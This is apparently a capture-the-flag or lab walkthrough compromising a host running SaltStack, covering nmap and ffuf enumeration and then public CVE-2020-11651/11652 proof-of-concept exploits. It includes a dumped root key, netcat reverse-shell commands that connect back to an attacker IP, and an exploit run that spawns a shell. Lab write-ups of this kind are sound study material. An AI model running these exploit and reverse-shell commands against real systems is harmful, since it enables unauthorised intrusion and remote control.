`nmap -A -T4 -p- 192.168.225.62`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%), MikroTik RouterOS 7.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
```


# HTTP (80)

Is a site powered by Mezzanine CMS, which shows some exploit for XSS but lets continue enumerating

![](Images/Pasted%20image%2020250509093416.png)

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.225.62:80/FUZZ -fc 301
```

# HTTP (8000)

On port 8000 we see what appears to an API of some sort. We can use this to enumerate the web service more

Additional Information `Powered by CherryPy 5.6.0` no results on searchsploit but on a google search we get a directory traversal [exploit](https://security.snyk.io/vuln/SNYK-PYTHON-CHERRYPY-449897)

![](Images/Pasted%20image%2020250509093519.png)

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.225.62:8000/FUZZ
```

```
index                   [Status: 200, Size: 146, Words: 12, Lines: 1, Duration: 56ms]
login                   [Status: 200, Size: 43, Words: 6, Lines: 1, Duration: 85ms]
events                  [Status: 401, Size: 753, Words: 155, Lines: 31, Duration: 62ms]
jobs                    [Status: 401, Size: 753, Words: 155, Lines: 31, Duration: 59ms]
stats                   [Status: 401, Size: 753, Words: 155, Lines: 31, Duration: 53ms]
logout                  [Status: 500, Size: 823, Words: 166, Lines: 31, Duration: 75ms]
keys                    [Status: 401, Size: 753, Words: 155, Lines: 31, Duration: 61ms]
run                     [Status: 200, Size: 146, Words: 12, Lines: 1, Duration: 56ms]
```

Appears this is where we are meant to go lets manually test some of these. If this is an API we can start to enumerate it further. Within the request headers is "Salt-API-3000-1"

![](Images/Pasted%20image%2020250509095357.png)

Lets search that up as the CherryPy CMS didn't have anything.

We find a RCE for Saltstack [here](https://github.com/jasperla/CVE-2020-11651-poc) lets go ahead and test this against our target machine. Since it has external libraries I will create a venv first to install salt.

```
python3 -m venv venv
source venv/bin/activate && pip install salt
```

I am having to do a lot of debugging with this specific POC. After installing a bunch of libraries I got it to work.

```
python3 poc.py --master 192.168.225.62
```

![](Images/Pasted%20image%2020250509101611.png)

```
[+] Checking salt-master (192.168.225.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: YW+X7MyAJUrsskh2mt7TkF3FvyJaWLbGfylEiu5AdjFu9Rr8ggmt+HuXNPmPn9rfU1T7rmGnPCY=
```

Based on the POC we should be able to get a shell with this

```
python3 poc.py --master 192.168.225.62 --exec "nc 192.168.45.244 80 -e /bin/sh"
python3 poc.py --master 192.168.225.62 --exec "nc 192.168.45.244 22 -e /bin/sh"
```

Both of these seems to have executed properly, but after successfully scheduling the job it did not produce any shells.

![](Images/Pasted%20image%2020250509102343.png)

We can take a look at what options we have for commands to see what we can do. I also found another version of this POC with a shell command built in. Find it [here](https://github.com/Al1ex/CVE-2020-11652/blob/main/CVE-2020-11652.py)

```
python3 poc2.py --master 192.168.225.62 --shell-LHOST 192.168.45.244 --shell-LPORT 80
```

Gets us execution and a shell.

![](Images/Pasted%20image%2020250509102657.png)





